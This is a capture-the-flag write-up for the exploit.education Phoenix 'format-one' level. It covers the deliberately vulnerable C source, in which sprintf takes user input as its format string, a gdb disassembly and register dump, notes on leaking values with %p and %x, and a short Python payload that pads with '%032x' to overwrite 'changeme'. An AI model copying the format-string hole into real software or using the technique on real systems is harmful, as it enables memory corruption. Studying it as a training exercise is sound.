@@ -1,0 +1,170 @@
+/*
+ * phoenix/format-one, by https://exploit.education
+ *
+ * Can you change the "changeme" variable?
+ *
+ * Why did the Tomato blush? It saw the salad dressing!
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int main(int argc, char **argv) {
+  struct {
+    char dest[32];
+    volatile int changeme;
+  } locals;
+  char buffer[16];
+
+  printf("%s\n", BANNER);
+
+  if (fgets(buffer, sizeof(buffer) - 1, stdin) == NULL) {
+    errx(1, "Unable to get buffer");
+  }
+  buffer[15] = 0;
+
+  locals.changeme = 0;
+
+  sprintf(locals.dest, buffer);
+
+  if (locals.changeme != 0x45764f6c) {
+    printf("Uh oh, 'changeme' is not the magic value, it is 0x%08x\n",
+        locals.changeme);
+  } else {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  }
+
+  exit(0);
+}
+
+Dump of assembler code for function main:
+   0x00000000004006ed <+0>:	push   rbp
+   0x00000000004006ee <+1>:	mov    rbp,rsp
+   0x00000000004006f1 <+4>:	sub    rsp,0x50
+   0x00000000004006f5 <+8>:	mov    DWORD PTR [rbp-0x44],edi
+   0x00000000004006f8 <+11>:	mov    QWORD PTR [rbp-0x50],rsi
+   0x00000000004006fc <+15>:	mov    edi,0x4007e0
+   0x0000000000400701 <+20>:	call   0x400530 <puts@plt>
+   0x0000000000400706 <+25>:	mov    rdx,QWORD PTR [rip+0x200433]        # 0x600b40 <stdin>
+   0x000000000040070d <+32>:	lea    rax,[rbp-0x40]
+   0x0000000000400711 <+36>:	mov    esi,0xf
+   0x0000000000400716 <+41>:	mov    rdi,rax
+   0x0000000000400719 <+44>:	call   0x400520 <fgets@plt>
+   0x000000000040071e <+49>:	test   rax,rax
+   0x0000000000400721 <+52>:	jne    0x400737 <main+74>
+   0x0000000000400723 <+54>:	mov    esi,0x40082b
+   0x0000000000400728 <+59>:	mov    edi,0x1
+   0x000000000040072d <+64>:	mov    eax,0x0
+   0x0000000000400732 <+69>:	call   0x400540 <errx@plt>
+   0x0000000000400737 <+74>:	mov    BYTE PTR [rbp-0x31],0x0
+   0x000000000040073b <+78>:	mov    DWORD PTR [rbp-0x10],0x0
+   0x0000000000400742 <+85>:	lea    rdx,[rbp-0x40]
+   0x0000000000400746 <+89>:	lea    rax,[rbp-0x30]
+   0x000000000040074a <+93>:	mov    rsi,rdx
+   0x000000000040074d <+96>:	mov    rdi,rax
+   0x0000000000400750 <+99>:	mov    eax,0x0
+=> 0x0000000000400755 <+104>:	call   0x400550 <sprintf@plt>
+   0x000000000040075a <+109>:	mov    eax,DWORD PTR [rbp-0x10]
+   0x000000000040075d <+112>:	cmp    eax,0x45764f6c
+   0x0000000000400762 <+117>:	je     0x40077a <main+141>
+   0x0000000000400764 <+119>:	mov    eax,DWORD PTR [rbp-0x10]
+   0x0000000000400767 <+122>:	mov    esi,eax
+   0x0000000000400769 <+124>:	mov    edi,0x400840
+   0x000000000040076e <+129>:	mov    eax,0x0
+   0x0000000000400773 <+134>:	call   0x400510 <printf@plt>
+   0x0000000000400778 <+139>:	jmp    0x400784 <main+151>
+   0x000000000040077a <+141>:	mov    edi,0x400878
+   0x000000000040077f <+146>:	call   0x400530 <puts@plt>
+   0x0000000000400784 <+151>:	mov    edi,0x0
+   0x0000000000400789 <+156>:	call   0x400560 <exit@plt>
+
+
+%p will print in hexadecimal value the arguments passed to sprintf. This depends on how the arguments are passed, in x86 architecture the arguments are passed through the stack. In our AMD65 architecture, the arguments are passed throught registers, and when there not more registers available throught the stack.
+
+We can see:
+
+For the given input:
+
+"%p%p%p%p%pAAAA"
+
+$rsi = holds the source, the first parameter of our functio call, which points to "%p%p%p%p%pAAAA"
+$rdi = holds the destination, where the data is going to be saved, points to $rbp-0x30
+
+The status of the registers at call time of sprintf:
+
+$rax   : 0x0               
+$rbx   : 0x00007fffffffe698  →  0x00007fffffffe89d  →  "/opt/phoenix/amd64/format-one"
+$rcx   : 0x00007ffff7ffc536  →  0x000000000000000a
+$rdx   : 0x00007fffffffe600  →  "%p%p%p%p%pAAAA"
+$rsp   : 0x00007fffffffe5f0  →  0x00007fffffffe698  →  0x00007fffffffe89d  →  "/opt/phoenix/amd64/format-one"
+$rbp   : 0x00007fffffffe640  →  0x0000000000000001
+$rsi   : 0x00007fffffffe600  →  "%p%p%p%p%pAAAA"
+$rdi   : 0x00007fffffffe610  →  0x0000000000000000
+$rip   : 0x0000000000400755  →  <main+104> call 0x400550 <sprintf@plt>
+$r8    : 0x101010101010101 
+$r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
+$r10   : 0x1               
+$r11   : 0x246             
+$r12   : 0x00007fffffffe6a8  →  0x00007fffffffe8bb  →  "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so[...]"
+$r13   : 0x00000000004006ed  →  <main+0> push rbp
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [carry PARITY adjust zero sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+
+And after calling, we can check the sprintfed data
+
+x/s $rbp-0x30
+
+"0x7fffffffe6000x7ffff7ffc5360x1010101010101010xa0a0a0a0a0a0a0a0x7fffffffe698AAAA"
+
+If we order it and compare with the registers:
+
+"
+0x7fffffffe600 = $rdx   : 0x00007fffffffe600  →  "%p%p%p%p%pAAAA"
+0x7ffff7ffc536 = $rcx   : 0x00007ffff7ffc536  →  0x000000000000000a
+0x101010101010101 = $r8    : 0x101010101010101 
+0xa0a0a0a0a0a0a0a = $r9    : 0xa0a0a0a0a0a0a0a  ("\n\n\n\n\n\n\n\n"?)
+0x7fffffffe698
+AAAA"
+
+With %x we get 8 chars (without the 0x0 extra chars in the beginning of %p)
+
+"
+ffffe600
+f7ffc534
+1010101
+a0a0a0a
+AAAA"
+
+ffffe600
+f7ffc537
+1010101
+a0a0a0a
+
+ffffe600
+f7ffc539
+01010101
+AA
+
+When can spefify a padding very easily:
+
+%032x -> whill print the hexadecimal value of the next argument with a 32 zero 0adding.
+
+%032x
+
+Python solution:
+
+    import sys
+    import struct
+
+    value = struct.pack("L", 0x45764f6c)
+
+    sys.stdout.buffer.write("%032x".encode('utf8'))
+    sys.stdout.buffer.write(value)
